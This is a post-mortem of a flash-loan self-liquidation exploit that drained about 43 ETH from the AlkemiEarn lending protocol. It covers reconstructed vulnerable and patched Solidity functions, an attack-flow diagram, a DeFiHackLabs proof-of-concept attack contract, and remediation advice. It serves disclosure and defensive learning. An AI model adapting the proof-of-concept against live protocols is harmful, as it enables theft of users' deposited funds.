# AlkemiEarn — Self-Liquidation Business Logic Vulnerability Analysis

| Item | Details |
|------|------|
| **Date** | 2026-03-10 |
| **Protocol** | AlkemiEarn |
| **Chain** | Ethereum |
| **Loss** | 43.45 ETH |
| **Attacker** | [0x0ed1...cd7](https://etherscan.io/address/0x0ed1c01b8420a965d7bd2374db02896464c91cd7) |
| **Attack Contract** | [0xE408...94B](https://etherscan.io/address/0xE408b52AEfB27A2FB4f1cD760A76DAa4BF23794B) |
| **Attack Tx** | [0xa170...6d9d](https://etherscan.io/tx/0xa17001eb39f867b8bed850de9107018a2d2503f95f15e4dceb7d68fff5ef6d9d) |
| **Vulnerable Contract** | [0x4822...a888](https://etherscan.io/address/0x4822D9172e5b76b9Db37B75f5552F9988F98a888) |
| **Root Cause** | Post-withdrawal health check absence in `withdraw()` combined with self-liquidation permitted in `liquidateBorrow()`, enabling abnormal withdrawal of 93.49 ETH |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-03/AlkemiEarn_exp.sol) |

---

## 1. Vulnerability Overview

AlkemiEarn is a lending protocol forked from Compound V1 (MoneyMarket pattern). A critical flaw existed in the protocol's `liquidateBorrow()` function: **it did not verify whether the liquidator (`msg.sender`) and the borrower (`borrower`) were the same address**.

The attacker exploited this flaw to construct the following circular structure:

1. Borrow funds via flash loan, deposit collateral, and draw a loan
2. Deliberately enter a liquidatable LTV
3. **Self-liquidate** to claim the liquidation bonus for oneself
4. Withdraw all collateral, repay the flash loan, and secure the remainder (43.45 ETH) as profit

The key insight is that the incentive (liquidation bonus) normally paid to a third-party liquidator in a standard liquidation is instead redirected to the attacker themselves during self-liquidation. Because debt reduction and bonus receipt occur within the same account, this results in an accounting error that effectively creates value from nothing.

Additionally, the `withdraw()` function did not re-validate account health (collateral ratio) after withdrawal, allowing full withdrawal even after the position had been placed in an abnormal state following self-liquidation. The ability to use the same asset (aweth) simultaneously as both collateral and debt further simplified the attack construction.

---

## 2. Vulnerable Code Analysis

### 2.1 liquidateBorrow() — Self-Liquidation Permitted (Core Vulnerability)

**Vulnerable code (estimated)**:
```solidity
function liquidateBorrow(
    address borrower,
    address borrowAsset,
    address collateralAsset,
    uint256 amountClose
) external payable {
    // ❌ No check for borrower == msg.sender
    // ❌ Anyone can liquidate their own position
    require(isUndercollateralized(borrower), "not liquidatable");

    uint256 seizeAmount = calculateSeizeTokens(
        borrowAsset, collateralAsset, amountClose
    );

    // Reduce debt
    borrowBalances[borrower][borrowAsset] -= amountClose;

    // Transfer collateral: borrower → msg.sender
    // ❌ When borrower == msg.sender, collateral is deducted then re-credited
    // ❌ Net profit equal to the liquidation bonus is generated
    collateralBalances[borrower][collateralAsset] -= seizeAmount;
    collateralBalances[msg.sender][collateralAsset] += seizeAmount;
}
```

Comparison: patched code:
```solidity
function liquidateBorrow(
    address borrower,
    address borrowAsset,
    address collateralAsset,
    uint256 amountClose
) external payable {
    // ✅ Prevent self-liquidation
    require(borrower != msg.sender, "cannot self-liquidate");
    require(isUndercollateralized(borrower), "not liquidatable");

    uint256 seizeAmount = calculateSeizeTokens(
        borrowAsset, collateralAsset, amountClose
    );
    borrowBalances[borrower][borrowAsset] -= amountClose;
    collateralBalances[borrower][collateralAsset] -= seizeAmount;
    collateralBalances[msg.sender][collateralAsset] += seizeAmount;
}
```

**Problem**: When `borrower` and `msg.sender` are identical, the collateral transfer is effectively a self-transfer. However, `seizeAmount` includes the liquidation bonus (typically 5–10%), while debt is reduced by `amountClose`. The result is an abnormal state where debt decreases while collateral experiences a net increase equal to the bonus.

### 2.2 withdraw() — No Post-Withdrawal Health Check

**Vulnerable code (estimated)**:
```solidity
function withdraw(address token, uint256 amount) external {
    uint256 balance = collateralBalances[msg.sender][token];
    uint256 withdrawAmount = amount == type(uint256).max ? balance : amount;
    require(withdrawAmount <= balance, "insufficient balance");

    collateralBalances[msg.sender][token] -= withdrawAmount;

    // ❌ No re-validation of collateral ratio after withdrawal
    // ❌ Full withdrawal possible even with outstanding loans
    payable(msg.sender).transfer(withdrawAmount);
}
```

Comparison: patched code:
```solidity
function withdraw(address token, uint256 amount) external {
    uint256 balance = collateralBalances[msg.sender][token];
    uint256 withdrawAmount = amount == type(uint256).max ? balance : amount;
    require(withdrawAmount <= balance, "insufficient balance");

    collateralBalances[msg.sender][token] -= withdrawAmount;

    // ✅ Post-withdrawal collateral ratio validation — health check if outstanding loans exist
    require(
        getAccountLiquidity(msg.sender) >= 0,
        "would cause undercollateralization"
    );

    payable(msg.sender).transfer(withdrawAmount);
}
```

**Problem**: After self-liquidation, the abnormally inflated collateral balance can be fully withdrawn with no health check whatsoever.

### 2.3 Same Asset Used as Both Collateral and Debt

```solidity
// Both supply() and borrow() accept aweth as an argument
AlkemiEarn.supply{value: 50 ether}(aweth, 50 ether);   // Deposit as collateral
AlkemiEarn.borrow(aweth, 39.5 ether);                    // Borrow the same asset

// ❌ Same asset permitted as both collateral and debt simultaneously
// ❌ Combined with self-liquidation, enables risk-free arbitrage
```

**Problem**: When the same asset is used simultaneously as both collateral and debt, price movement risk cancels out, allowing the attacker to construct a position targeting only the liquidation bonus.

---

## 3. Attack Flow

### 3.1 Preparation Phase

- No prior preparation required. The attack is completed within a single transaction.
- The attacker only needs to deploy the Attacker contract.

### 3.2 Execution Phase

```
┌─────────────────────────────────────┐
│  EOA Attacker (0x0ed1...cd7)        │
└──────────────┬──────────────────────┘
               │ calls attack()
               ▼
┌─────────────────────────────────────┐
│  Attacker Contract (0xE408...94B)   │
│  ① Request flashLoan(51 WETH)       │
└──────────────┬──────────────────────┘
               ▼
┌─────────────────────────────────────┐
│  Balancer Vault                     │
│  → Disburse 51 WETH loan            │
└──────────────┬──────────────────────┘
               │ receiveFlashLoan() callback
               ▼
┌─────────────────────────────────────┐
│  ② WETH.withdraw(51 ETH)           │
│     → Convert WETH to native ETH    │
│                                     │
│  ③ supply{value: 50 ETH}(aweth)    │
│     → Deposit 50 ETH as collateral  │
│                                     │
│  ④ borrow(aweth, 39.5 ETH)         │
│     → Borrow 39.5 ETH               │
│     → Enter liquidatable LTV        │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│  ★ ⑤ liquidateBorrow(self, ...)    │
│     borrower == msg.sender          │
│     → Debt reduced + liquidation    │
│       bonus credited to self        │
│     → Collateral balance abnormally │
│       inflated                      │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│  ⑥ withdraw(aweth, type(uint).max) │
│     → Full collateral withdrawal    │
│       (no health check)             │
│                                     │
│  ⑦ WETH.deposit{value: 51 ETH}     │
│     → Convert ETH → WETH            │
│     → Repay 51 WETH to Balancer     │
│                                     │
│  ⑧ Transfer remaining 43.45 ETH    │
│     → EOA attacker                  │
└─────────────────────────────────────┘
```

### 3.3 Outcome

- **Attacker profit**: 43.45 ETH (excluding gas fees)
- **Protocol loss**: 43.45 ETH (drained directly from AlkemiEarn liquidity pool)
- **Initial capital**: 0 (funded via Balancer flash loan at 0% fee)

---

## 4. PoC Code (DeFiHackLabs)

```solidity
function attack() external {
    // ① Flash loan 51 WETH from Balancer Vault
    address[] memory tokens = new address[](1);
    tokens[0] = address(weth);
    uint256[] memory amounts = new uint256[](1);
    amounts[0] = 51 ether;
    vault.flashLoan(address(this), tokens, amounts, "");
}

function receiveFlashLoan(
    address[] memory tokens,
    uint256[] memory amounts,
    uint256[] memory feeAmounts,
    bytes memory userData
) external {
    // ② Convert WETH → ETH
    weth.withdraw(amounts[0]);

    // ③ Deposit 50 ETH as collateral into AlkemiEarn
    victimContract.supply{value: 50 ether}(aweth, 50 ether);

    // ④ Borrow 39.5 ETH — deliberately enter liquidatable LTV
    victimContract.borrow(aweth, 39.5 ether);

    // ⑤ ★ Core: designate self as liquidation target
    //    borrower == address(this) == msg.sender
    //    liquidation bonus credited to self
    uint256 amount = victimContract.getBorrowBalance(address(this), aweth);
    victimContract.liquidateBorrow{value: amount}(
        address(this),  // ← self
        aweth, aweth, amount
    );

    // ⑥ Withdraw all collateral (possible due to absent health check)
    victimContract.withdraw(aweth, type(uint256).max);

    // ⑦ Repay flash loan
    weth.deposit{value: 51 ether}();
    weth.transfer(address(vault), amounts[0] + feeAmounts[0]);

    // ⑧ Transfer net profit (43.45 ETH) to attacker EOA
    TransferHelper.safeTransferETH(attacker, address(this).balance);
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | `withdraw()` missing post-withdrawal health check — allows full withdrawal of 93.49 ETH from abnormal state | **CRITICAL** | CWE-682 (Incorrect Calculation) |
| V-02 | Self-Liquidation permitted — no `borrower == msg.sender` check in `liquidateBorrow()` | **CRITICAL** | CWE-285 (Improper Authorization) |
| V-03 | Flash Loan amplification — large position built with uncollateralized funds and exploited within a single Tx | **HIGH** | CWE-841 |
| V-04 | Same asset used as both collateral and debt — aweth permitted in both `supply` and `borrow` | **HIGH** | CWE-20 |

### V-01: `withdraw()` Missing Post-Withdrawal Health Check (Root Cause)

- **Description**: `withdraw()` does not re-validate account health (collateral ratio) after withdrawal, allowing full collateral withdrawal from an account left in an abnormal state by self-liquidation.
- **On-chain verification**: Only 50 ETH was supplied, yet calling `withdraw(type(uint256).max)` returned **93.4934 ETH** — the inflated supply balance created by self-liquidation was returned without any validation.
- **Impact**: When combined with self-liquidation, directly drains funds from the protocol liquidity pool.
- **Attack condition**: Absence of `accountLiquidity` validation during `withdraw` execution
- **Defense**: Had `getAccountLiquidity(msg.sender) >= 0` been checked after `withdraw`, even if self-liquidation were possible, the abnormal withdrawal would have been blocked.

**Why this is the root cause**: Blocking self-liquidation in `liquidateBorrow` would prevent this specific attack vector, but as long as the health check is absent from `withdraw`, abnormal withdrawals remain possible via other paths (e.g., oracle manipulation, collateral value fluctuations). The health check in `withdraw` is the **defense line that covers all attack vectors**.

### V-02: Self-Liquidation Permitted

- **Description**: The absence of a `borrower == msg.sender` check in `liquidateBorrow()` allows liquidation of one's own position. The liquidation bonus is credited to oneself, abnormally inflating the supply balance.
- **On-chain verification**: `liquidateBorrow{value: 39.5395 ETH}(self, aweth, aweth, 39.5395 ETH)` — borrower and msg.sender are the same address (0xE408...)
- **Impact**: Debt elimination + liquidation bonus credited to self → abnormal increase in supply balance → combined with V-01 to enable excess withdrawal.
- **Attack condition**: Absence of self-liquidation prevention logic in `liquidateBorrow`

### V-03: Flash Loan Amplification

- **Description**: 51 ETH procured without collateral via a Balancer flash loan (0% fee), enabling the attack with zero capital.
- **Impact**: Attacker can drain protocol funds starting from zero initial capital. Attack executable with only gas fees.
- **Attack condition**: Access to a flash loan provider + existence of V-01/V-02

### V-04: Same Asset Used as Both Collateral and Debt

- **Description**: aweth can be used simultaneously in both `supply` (collateral) and `borrow` (debt), eliminating price movement risk.
- **Impact**: Forms a risk-free structure where the attacker can exploit purely the mechanism flaw.
- **Attack condition**: Protocol does not restrict simultaneous use of the same asset as both collateral and debt

### Attack Accounting via On-Chain Figures

```
Inputs:
  supply:        50.0000 ETH
  liquidation:  +39.5395 ETH (self-liquidation payment)
  ─────────────────────────
  Total in:      89.5395 ETH

Returns:
  borrow:        39.5000 ETH
  withdraw:     +93.4934 ETH  ← V-01: full withdrawal without validation
  ─────────────────────────
  Total out:    132.9934 ETH

Net profit:      43.454 ETH (= 132.99 - 89.54)
```

---

## 6. Remediation Recommendations

### Immediate Actions

```solidity
// Fix 1 (top priority): Post-withdrawal health check — this alone blocks the entire attack
function withdraw(address token, uint256 amount) external {
    // ...
    collateralBalances[msg.sender][token] -= withdrawAmount;
    // ✅ Post-withdrawal collateral ratio validation — blocks abnormal balance withdrawal at the source
    require(getAccountLiquidity(msg.sender) >= 0, "undercollateralized");
    payable(msg.sender).transfer(withdrawAmount);
}

// Fix 2: Block self-liquidation — defense in depth
function liquidateBorrow(address borrower, ...) external payable {
    // ✅ Prevent self-liquidation
    require(borrower != msg.sender, "cannot self-liquidate");
    // ...
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| Withdrawal health check (V-01, **root cause**) | Integrate invariant checks at the end of all state-changing functions. Adopt Compound V2's `getHypotheticalAccountLiquidity` pattern |
| Self-liquidation (V-02) | `require(borrower != msg.sender)` + fuzz testing across all argument combinations of the liquidation function |
| Flash loan amplification (V-03) | Enforce a minimum 1-block wait after supply/borrow (record `block.number`) |
| Same asset (V-04) | Add logic to restrict simultaneous use of the same asset as both collateral and debt |
| Fork security | Backport the latest security patches from Compound V2/V3 to the fork |

---

## 7. Lessons Learned

1. **A post-`withdraw` health check is the last line of defense.** In this attack, the self-liquidation in `liquidateBorrow` was the mechanism that abnormally inflated the supply balance, but the actual fund outflow occurred when `withdraw(type(uint256).max)` returned 93.49 ETH without any validation. Had an `accountLiquidity >= 0` check been in place after `withdraw`, **the fund outflow would have been blocked even if self-liquidation were possible**.

2. **Blocking self-referential calls is a defense-in-depth measure.** In functions involving two parties (liquidation, delegation, transfer, etc.), the `msg.sender == target` path must always be validated. This is not a root-cause fix, but it is an important defense-in-depth layer that reduces the attack surface.

3. **Forked protocols carry more risk than the original.** AlkemiEarn is a Compound V1 fork, and vulnerabilities already patched in the original Compound V2 were not backported to the fork. Operating a fork requires a continuous process of tracking and retroactively applying the original's security patches.

4. **Invariant validation after state changes should become standard practice.** Patterns that assert invariants such as `accountLiquidity >= 0` and `totalBorrow <= totalCollateral * factor` **at the exit point of every external function** should be adopted. This single principle alone would have defended against V-01 and covers future unknown attack vectors as well.

5. **Flash loans invalidate all single-transaction capital assumptions.** Any assumption that "a user would not hold this much capital" is meaningless against flash loans.